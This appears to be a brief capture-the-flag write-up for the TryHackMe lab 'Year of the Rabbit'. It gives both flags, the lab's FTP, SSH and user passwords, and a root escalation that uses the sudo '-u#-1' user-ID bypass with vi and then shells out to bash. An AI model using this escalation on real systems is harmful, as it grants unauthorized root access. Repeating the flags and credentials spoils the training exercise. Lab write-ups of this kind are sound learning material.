# TryHackMe Web Year of the Rabbit

# Saikat Karmakar | Jan 4:2021

1. What is the user flag?
```
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```
2. What is the root flag?
```
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

***Notes***

# ftp
user = ftpuser
pass = 5iez1wGXKfPKQ

# ssh //brainfuck decode(https://www.dcode.fr/brainfuck-language)
User: eli
Password: DSpDiM1wAEwid

# other user
user = gwendoline
pass = MniVCQVhQHUNI

# root acces 
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

:!/bin/bash -> in vi get the root shell 